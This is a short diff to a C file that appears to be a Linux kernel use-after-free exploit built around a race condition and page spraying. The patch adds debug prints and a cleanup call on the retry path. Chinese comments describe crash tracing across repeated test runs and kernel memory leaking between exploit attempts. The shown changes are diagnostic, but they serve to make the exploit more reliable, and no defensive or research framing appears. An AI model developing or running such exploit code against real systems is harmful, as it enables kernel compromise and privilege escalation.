@@ -903,6 +903,8 @@ static int child_race(void)
 	sigemptyset(&block);
 	sigaddset(&block, SIGRTMIN);
 	sigprocmask(SIG_BLOCK, &block, NULL);
+	/* 2.0.28 诊断：第 7 次实测 attempt 2 崩在本打印之前，补上进入标记 */
+	dprintf(STDOUT_FILENO, "[race_child] enter pid=%d\n", getpid());
 	if (prepare_vmas())
 		_exit(110);
 	dprintf(STDOUT_FILENO, "[race_child] vmas ready pid=%d\n", getpid());
@@ -1648,6 +1650,7 @@ static int one_uaf(uint64_t target)
 			close(g_report[1]);
 		child_race();
 	}
+	dprintf(STDOUT_FILENO, "[uaf] child=%d spawned\n", child);
 	if (wait_phase(1)) {
 		dprintf(STDOUT_FILENO, "[uaf] child never readied phase=%d\n",
 			atomic_load_explicit(&ipc->phase, memory_order_acquire));
@@ -1711,6 +1714,13 @@ static int one_uaf(uint64_t target)
 	stop_helpers();
 	if (!WIFSIGNALED(status) || WTERMSIG(status) != SIGKILL) {
 		dprintf(STDOUT_FILENO, "[uaf] reap was not SIGKILL\n");
+		/*
+		 * 2.0.28：重试路径必须回收本轮 stream 资源——宽限期让新镜像常在此分支
+		 * 自然退出（原设计 SIGKILL 总赢、几乎不走这里），不复 close 的话每轮
+		 * 重试泄漏 4×16MB socket 缓冲，12 轮上限下可累积数百 MB 内核内存。
+		 * 此时无任何内核对象指向喷洒页（installed 未执行），关闭是安全的。
+		 */
+		close_stream();
 		return -1;
 	}
 	return 0;
